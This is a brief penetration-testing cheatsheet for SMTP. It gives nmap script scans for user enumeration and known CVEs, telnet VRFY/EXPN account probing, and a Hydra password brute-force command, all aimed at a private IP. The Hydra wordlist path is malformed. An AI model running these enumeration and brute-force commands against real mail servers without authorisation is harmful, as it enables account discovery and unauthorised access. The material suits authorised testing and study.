# SMTP Exploitation and Enumeration Cheatsheet

## Nmap Scripts

```bash
nmap 192.168.1.1 --script=smtp* -p 25
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1
```

## SMTP Connection

```bash
telnet 192.168.1.1 25
VRFY root
EXPN root
```

## Brute Force SMTP with Hydra

```bash
hydra -P /usr/share/wordlistsnmap.lst 192.168.1.1 smtp
